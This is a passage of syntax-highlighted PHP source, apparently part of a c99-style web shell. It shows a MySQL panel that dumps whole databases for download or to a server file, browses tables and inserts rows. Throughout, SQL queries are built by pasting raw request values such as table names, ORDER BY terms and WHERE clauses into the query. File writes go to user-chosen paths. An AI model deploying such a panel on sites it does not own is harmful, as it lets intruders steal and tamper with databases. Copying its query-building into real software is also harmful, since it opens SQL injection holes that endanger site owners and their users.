<span class="lineno"> 736</span>             <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;Only tables (explode </span><span class="se">\&quot;</span><span class="s2">;</span><span class="se">\&quot;</span><span class="s2">) &lt;b&gt;&lt;sup&gt;1&lt;/sup&gt;&lt;/b&gt;:&lt;/b&gt; &lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">dmptbls</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">+</span><span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 737</span>             <span class="k">if</span> <span class="p">(</span><span class="nv">$dump_file</span><span class="p">)</span> <span class="p">{</span><span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$dump_file</span><span class="p">;}</span>
<span class="lineno"> 738</span>             <span class="k">else</span> <span class="p">{</span><span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="s2">&quot;./dump_&quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nv">$sql_db</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d-m-Y-H-i-s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.sql&quot;</span><span class="p">);}</span>
<span class="lineno"> 739</span>             <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;File:&lt;/b&gt; &lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_dump_file</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$tmp</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span><span class="o">+</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span> <span class="o">%</span> <span class="mi">30</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 740</span>             <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;Download: &lt;/b&gt; &lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_dump_download</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> checked&gt;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 741</span>             <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;Save to file: &lt;/b&gt; &lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_dump_savetofile</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> checked&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 742</span>             <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;&lt;br&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Dump</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;&lt;sup&gt;1&lt;/sup&gt;&lt;/b&gt; - all, if empty&quot;</span><span class="p">;</span>
<span class="lineno"> 743</span>             <span class="k">echo</span> <span class="s2">&quot;&lt;/form&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 744</span>           <span class="p">}</span>
<span class="lineno"> 745</span>           <span class="k">else</span> <span class="p">{</span>
<span class="lineno"> 746</span>             <span class="nv">$diplay</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
<span class="lineno"> 747</span>             <span class="nv">$set</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno"> 748</span>             <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;sock&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$sql_sock</span><span class="p">;</span>
<span class="lineno"> 749</span>             <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;db&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$sql_db</span><span class="p">;</span>
<span class="lineno"> 750</span>             <span class="nv">$dump_out</span> <span class="o">=</span> <span class="s2">&quot;download&quot;</span><span class="p">;</span>
<span class="lineno"> 751</span>             <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;print&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 752</span>             <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;nl2br&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 753</span>             <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 754</span>             <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;file&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$dump_file</span><span class="p">;</span>
<span class="lineno"> 755</span>             <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;add_drop&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
<span class="lineno"> 756</span>             <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;onlytabs&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno"> 757</span>             <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$dmptbls</span><span class="p">))</span> <span class="p">{</span><span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;onlytabs&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;;&quot;</span><span class="p">,</span><span class="nv">$dmptbls</span><span class="p">);}</span>
<span class="lineno"> 758</span>             <span class="nv">$ret</span> <span class="o">=</span> <span class="nx">mysql_dump</span><span class="p">(</span><span class="nv">$set</span><span class="p">);</span>
<span class="lineno"> 759</span>             <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_dump_download</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 760</span>               <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
<span class="lineno"> 761</span>               <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-type: application/octet-stream&quot;</span><span class="p">);</span>
<span class="lineno"> 762</span>               <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-length: &quot;</span><span class="o">.</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
<span class="lineno"> 763</span>               <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-disposition: attachment; filename=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$sql_dump_file</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">;&quot;</span><span class="p">);</span>
<span class="lineno"> 764</span>               <span class="k">echo</span> <span class="nv">$ret</span><span class="p">;</span>
<span class="lineno"> 765</span>               <span class="k">exit</span><span class="p">;</span>
<span class="lineno"> 766</span>             <span class="p">}</span>
<span class="lineno"> 767</span>             <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_dump_savetofile</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 768</span>               <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$sql_dump_file</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno"> 769</span>               <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;Dump error! Can&#39;t write to </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_dump_file</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">!&quot;</span><span class="p">;}</span>
<span class="lineno"> 770</span>               <span class="k">else</span> <span class="p">{</span>
<span class="lineno"> 771</span>                 <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span>
<span class="lineno"> 772</span>                 <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="lineno"> 773</span>                 <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;Dumped! Dump has been writed to </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$sql_dump_file</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> (&quot;</span><span class="o">.</span><span class="nx">view_size</span><span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$sql_dump_file</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;)&lt;/b&gt;.&quot;</span><span class="p">;</span>
<span class="lineno"> 774</span>               <span class="p">}</span>
<span class="lineno"> 775</span>             <span class="p">}</span>
<span class="lineno"> 776</span>             <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;Dump: nothing to do!&lt;/b&gt;&quot;</span><span class="p">;}</span>
<span class="lineno"> 777</span>           <span class="p">}</span>
<span class="lineno"> 778</span>         <span class="p">}</span>
<span class="lineno"> 779</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$diplay</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 780</span>           <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 781</span>               <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_act</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_tbl_act</span> <span class="o">=</span> <span class="s2">&quot;browse&quot;</span><span class="p">;}</span>
<span class="lineno"> 782</span>               <span class="nv">$count</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT COUNT(*) FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;`;&quot;</span><span class="p">);</span>
<span class="lineno"> 783</span>               <span class="nv">$count_row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$count</span><span class="p">);</span>
<span class="lineno"> 784</span>               <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$count</span><span class="p">);</span>
<span class="lineno"> 785</span>               <span class="nv">$tbl_struct_result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW FIELDS FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;`;&quot;</span><span class="p">);</span>
<span class="lineno"> 786</span>                 <span class="nv">$tbl_struct_fields</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno"> 787</span>                 <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$tbl_struct_result</span><span class="p">))</span> <span class="p">{</span><span class="nv">$tbl_struct_fields</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;}</span>
<span class="lineno"> 788</span>               <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$sql_ls</span> <span class="o">&gt;</span> <span class="o">@</span><span class="nv">$sql_le</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$sql_le</span> <span class="o">=</span> <span class="nv">$sql_ls</span> <span class="o">+</span> <span class="nv">$perpage</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 789</span>               <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_page</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_tbl_page</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 790</span>               <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_ls</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_tbl_ls</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 791</span>               <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_le</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sql_tbl_le</span> <span class="o">=</span> <span class="mi">30</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 792</span>               <span class="nv">$perpage</span> <span class="o">=</span> <span class="nv">$sql_tbl_le</span> <span class="o">-</span> <span class="nv">$sql_tbl_ls</span><span class="p">;</span>
<span class="lineno"> 793</span>               <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$perpage</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$perpage</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 794</span>               <span class="nv">$numpages</span> <span class="o">=</span> <span class="nv">$count_row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">/</span><span class="nv">$perpage</span><span class="p">;</span>
<span class="lineno"> 795</span>               <span class="nv">$e</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$sql_order</span><span class="p">);</span>
<span class="lineno"> 796</span>               <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$e</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 797</span>                 <span class="k">if</span> <span class="p">(</span><span class="nv">$e</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;d&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$asc_desc</span> <span class="o">=</span> <span class="s2">&quot;DESC&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 798</span>                 <span class="k">else</span> <span class="p">{</span> <span class="nv">$asc_desc</span> <span class="o">=</span> <span class="s2">&quot;ASC&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 799</span>                 <span class="nv">$v</span> <span class="o">=</span> <span class="s2">&quot;ORDER BY `&quot;</span><span class="o">.</span><span class="nv">$e</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;` &quot;</span><span class="o">.</span><span class="nv">$asc_desc</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="p">;</span>
<span class="lineno"> 800</span>               <span class="p">}</span>
<span class="lineno"> 801</span>               <span class="k">else</span> <span class="p">{</span><span class="nv">$v</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;}</span>
<span class="lineno"> 802</span>               <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;` &quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;LIMIT &quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot; , &quot;</span><span class="o">.</span><span class="nv">$perpage</span><span class="o">.</span><span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno"> 803</span>               <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">print</span><span class="p">(</span><span class="nx">mysql_smarterror</span><span class="p">());</span>
<span class="lineno"> 804</span>               <span class="k">echo</span> <span class="s2">&quot;&lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&gt;&lt;center&gt;&lt;b&gt;Table &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; (&quot;</span><span class="o">.</span><span class="nb">mysql_num_fields</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; cols and &quot;</span><span class="o">.</span><span class="nv">$count_row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; rows)&lt;/b&gt;&lt;/center&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 805</span>               <span class="k">echo</span> <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_act=structure</span><span class="se">\&quot;</span><span class="s2">&gt;[&lt;b&gt; Structure &lt;/b&gt;]&lt;/a&gt; &amp;nbsp; &quot;</span><span class="p">;</span>
<span class="lineno"> 806</span>               <span class="k">echo</span> <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_act=browse</span><span class="se">\&quot;</span><span class="s2">&gt;[&lt;b&gt; Browse &lt;/b&gt;]&lt;/a&gt; &amp;nbsp; &quot;</span><span class="p">;</span>
<span class="lineno"> 807</span>               <span class="k">echo</span> <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_act=tbldump&amp;thistbl=1</span><span class="se">\&quot;</span><span class="s2">&gt;[&lt;b&gt; Dump &lt;/b&gt;]&lt;/a&gt; &amp;nbsp; &quot;</span><span class="p">;</span>
<span class="lineno"> 808</span>               <span class="k">echo</span> <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_act=insert</span><span class="se">\&quot;</span><span class="s2">&gt;[&amp;nbsp;&lt;b&gt;Insert&lt;/b&gt;&amp;nbsp;]&lt;/a&gt; &amp;nbsp; &quot;</span><span class="p">;</span>
<span class="lineno"> 809</span>               <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_tbl_act</span> <span class="o">==</span> <span class="s2">&quot;structure&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;Under construction!&lt;/b&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 810</span>               <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_tbl_act</span> <span class="o">==</span> <span class="s2">&quot;insert&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 811</span>                 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$sql_tbl_insert</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_tbl_insert</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
<span class="lineno"> 812</span>                 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_insert_radio</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;Under construction!&lt;/b&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 813</span>                 <span class="k">else</span> <span class="p">{</span>
<span class="lineno"> 814</span>                   <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;Inserting row into table:&lt;/b&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 815</span>                   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_insert_q</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 816</span>                     <span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">;</span>
<span class="lineno"> 817</span>                     <span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot; WHERE&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_insert_q</span><span class="p">;</span>
<span class="lineno"> 818</span>                     <span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot; LIMIT 1;&quot;</span><span class="p">;</span>
<span class="lineno"> 819</span>                     <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="nv">$sql_sock</span><span class="p">)</span> <span class="k">or</span> <span class="k">print</span><span class="p">(</span><span class="s2">&quot;&lt;br&gt;&lt;br&gt;&quot;</span><span class="o">.</span><span class="nx">mysql_smarterror</span><span class="p">());</span>
<span class="lineno"> 820</span>                     <span class="nv">$values</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
<span class="lineno"> 821</span>                     <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
<span class="lineno"> 822</span>                   <span class="p">}</span>
<span class="lineno"> 823</span>                   <span class="k">else</span> <span class="p">{</span><span class="nv">$values</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
<span class="lineno"> 824</span>                   <span class="k">echo</span> <span class="s2">&quot;&lt;form method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;table width=</span><span class="se">\&quot;</span><span class="s2">1%</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Field&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Type&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Function&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Value&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 825</span>                   <span class="k">foreach</span> <span class="p">(</span><span class="nv">$tbl_struct_fields</span> <span class="k">as</span> <span class="nv">$field</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 826</span>                     <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$field</span><span class="p">[</span><span class="s2">&quot;Field&quot;</span><span class="p">];</span>
<span class="lineno"> 827</span>                     <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_insert_q</span><span class="p">))</span> <span class="p">{</span><span class="nv">$v</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;}</span>
<span class="lineno"> 828</span>                     <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&lt;b&gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$field</span><span class="p">[</span><span class="s2">&quot;Type&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&lt;td&gt;&lt;select name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_insert_functs[&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;]</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;option value=</span><span class="se">\&quot;\&quot;</span><span class="s2">&gt;&lt;/option&gt;&lt;option&gt;PASSWORD&lt;/option&gt;&lt;option&gt;MD5&lt;/option&gt;&lt;option&gt;ENCRYPT&lt;/option&gt;&lt;option&gt;ASCII&lt;/option&gt;&lt;option&gt;CHAR&lt;/option&gt;&lt;option&gt;RAND&lt;/option&gt;&lt;option&gt;LAST_INSERT_ID&lt;/option&gt;&lt;option&gt;COUNT&lt;/option&gt;&lt;option&gt;AVG&lt;/option&gt;&lt;option&gt;SUM&lt;/option&gt;&lt;option value=</span><span class="se">\&quot;\&quot;</span><span class="s2">&gt;--------&lt;/option&gt;&lt;option&gt;SOUNDEX&lt;/option&gt;&lt;option&gt;LCASE&lt;/option&gt;&lt;option&gt;UCASE&lt;/option&gt;&lt;option&gt;NOW&lt;/option&gt;&lt;option&gt;CURDATE&lt;/option&gt;&lt;option&gt;CURTIME&lt;/option&gt;&lt;option&gt;FROM_DAYS&lt;/option&gt;&lt;option&gt;FROM_UNIXTIME&lt;/option&gt;&lt;option&gt;PERIOD_ADD&lt;/option&gt;&lt;option&gt;PERIOD_DIFF&lt;/option&gt;&lt;option&gt;TO_DAYS&lt;/option&gt;&lt;option&gt;UNIX_TIMESTAMP&lt;/option&gt;&lt;option&gt;USER&lt;/option&gt;&lt;option&gt;WEEKDAY&lt;/option&gt;&lt;option&gt;CONCAT&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_insert[&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;]</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$values</span><span class="p">[</span><span class="nv">$name</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=50&gt;&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 829</span>                     <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
<span class="lineno"> 830</span>                   <span class="p">}</span>
<span class="lineno"> 831</span>                   <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 832</span>                   <span class="k">echo</span> <span class="s2">&quot;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">radio</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_insert_radio</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_insert_q</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot; checked&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;&gt;&lt;b&gt;Insert as new row&lt;/b&gt;&quot;</span><span class="p">;</span>
